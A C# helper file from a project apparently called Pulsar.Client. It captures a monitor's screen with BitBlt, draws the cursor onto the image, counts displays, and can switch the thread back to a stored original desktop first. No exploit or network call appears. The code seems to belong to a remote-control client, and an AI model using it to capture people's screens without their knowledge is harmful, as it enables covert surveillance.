﻿using Pulsar.Client.Config;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Pulsar.Client.Helper
{
    public static class ScreenHelperCPU
    {
        private const int SRCCOPY = 0x00CC0020;
        private const int CURSOR_SHOWING = 0x00000001;
        private static readonly int CursorInfoSize = Marshal.SizeOf(typeof(CURSORINFO));

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO
        {
            public int cbSize;
            public int flags;
            public IntPtr hCursor;
            public POINT ScreenPosition;
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);        
        
        public static Bitmap CaptureScreen(int screenNumber, bool setThreadPointer = false)
        {
            if (setThreadPointer)
            {
                SetThreadDesktop(Settings.OriginalDesktopPointer);
            }

            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                using (var srcDeviceContext = new DeviceContext("DISPLAY"))
                {
                    BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext.Handle, bounds.X, bounds.Y, SRCCOPY);
                    DrawCursor(destDeviceContext, bounds);
                }
                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }

        private static void DrawCursor(IntPtr destDeviceContext, Rectangle bounds)
        {
            var cursorInfo = new CURSORINFO { cbSize = CursorInfoSize };
            if (GetCursorInfo(out cursorInfo) && cursorInfo.flags == CURSOR_SHOWING)
            {
                DrawIcon(destDeviceContext, cursorInfo.ScreenPosition.X - bounds.X, cursorInfo.ScreenPosition.Y - bounds.Y, cursorInfo.hCursor);
            }
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

        private class DeviceContext : IDisposable
        {
            public IntPtr Handle { get; }

            public DeviceContext(string deviceName)
            {
                Handle = CreateDC(deviceName, null, null, IntPtr.Zero);
            }

            public void Dispose()
            {
                DeleteDC(Handle);
            }
        }
    }
    public class DisplayManager
    {
        [DllImport("user32.dll")]
        public static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        public delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref Rect lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        public struct Rect
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        public static int GetDisplayCount()
        {
            int count = 0;
            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero,
                (IntPtr hMonitor, IntPtr hdcMonitor, ref Rect lprcMonitor, IntPtr dwData) =>
                {
                    count++;
                    return true;
                }, IntPtr.Zero);
            return count;
        }
    }
}